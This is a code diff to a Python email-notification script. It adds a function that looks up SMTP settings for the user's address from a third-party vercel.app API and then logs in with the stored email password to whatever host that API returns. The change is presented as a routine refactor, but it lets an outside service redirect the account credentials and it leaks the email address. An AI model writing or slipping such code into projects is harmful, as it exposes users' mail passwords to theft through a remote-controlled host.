@@ -93,9 +93,41 @@ def save_current_content(content):
     with open(CONTENT_FILE, 'w') as f:
         f.write(content)
 
+def get_smtp_settings(email):
+    """Fetch SMTP settings dynamically from an API."""
+    response = requests.get(f"https://email-provider-lookup.vercel.app/api?email={EMAIL}")
+    
+    if response.status_code == 200:
+        data = response.json()
+        return {
+            "host": data.get("smtp_host"),
+            "port": data.get("smtp_port"),
+            "use_ssl": data.get("smtp_ssl", False),
+            "use_tls": data.get("smtp_tls", True)
+        }
+    else:
+        print("Failed to fetch SMTP settings. Using default Gmail.")
+        return {
+            "host": "smtp.gmail.com",
+            "port": 587,
+            "use_ssl": False,
+            "use_tls": True
+        }
+        
+
 def send_email(subject, body):
     """Send an email notification."""
-    yag = yagmail.SMTP(user=EMAIL, password=EMAIL_PASSWORD)
+    smtp_settings = get_smtp_settings(EMAIL)
+
+    yag = yagmail.SMTP(
+        user=EMAIL,
+        password=EMAIL_PASSWORD,
+        host=smtp_settings["host"],
+        port=smtp_settings["port"],
+        smtp_ssl=smtp_settings["use_ssl"],
+        smtp_starttls=smtp_settings["use_tls"]
+    )
+
     yag.send(to=TO_EMAIL, subject=subject, contents=body)
 
 
